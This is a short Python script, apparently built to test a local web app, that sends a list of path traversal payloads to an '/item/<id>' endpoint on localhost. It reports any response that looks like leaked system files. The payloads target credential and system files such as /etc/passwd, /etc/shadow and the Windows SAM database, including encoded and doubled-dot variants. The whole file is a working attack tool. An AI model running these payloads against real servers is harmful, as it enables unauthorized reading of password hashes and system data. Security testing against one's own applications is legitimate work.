#!/usr/bin/env python3
"""
Path Traversal Attack Script
Tests the /item/<id> endpoint with path traversal payloads
"""

import requests
import time
import sys

BASE_URL = "http://localhost:5000"

def path_traversal_attack():
    """Perform path traversal attacks on the item endpoint"""
    print("\n" + "="*60)
    print("PATH TRAVERSAL ATTACK")
    print("="*60)
    
    # Path traversal payloads
    payloads = [
        "../../etc/passwd",
        "....//....//etc/passwd",
        "..%2F..%2Fetc%2Fpasswd",
        "../../etc/shadow",
        "../../proc/version",
        "../../etc/hosts",
        "..\\..\\..\\windows\\system32\\config\\sam",  # Windows variant
        "/etc/passwd",
        "....//....//....//etc/passwd",
    ]
    
    for payload in payloads:
        print(f"\n[*] Testing payload: {payload}")
        try:
            response = requests.get(
                f"{BASE_URL}/item/{payload}",
                timeout=5
            )
            print(f"[+] Status Code: {response.status_code}")
            print(f"[+] Response length: {len(response.text)} bytes")
            
            # Check for signs of successful path traversal
            if response.status_code == 200:
                if "root:" in response.text or "daemon:" in response.text:
                    print("[!] POTENTIAL PATH TRAVERSAL SUCCESS - System file content detected!")
                elif "File content:" in response.text:
                    print("[!] POTENTIAL PATH TRAVERSAL SUCCESS - File reading attempted!")
                else:
                    print(f"[*] Response preview: {response.text[:200]}")
            
            time.sleep(0.5)  # Small delay between requests
            
        except requests.exceptions.RequestException as e:
            print(f"[!] Error: {e}")
            return False
    
    print("\n[+] Path traversal attack completed")
    return True

if __name__ == "__main__":
    print("Starting Path Traversal Attack...")
    print("Make sure the webapp is running on http://localhost:5000")
    time.sleep(2)
    
    success = path_traversal_attack()
    sys.exit(0 if success else 1)

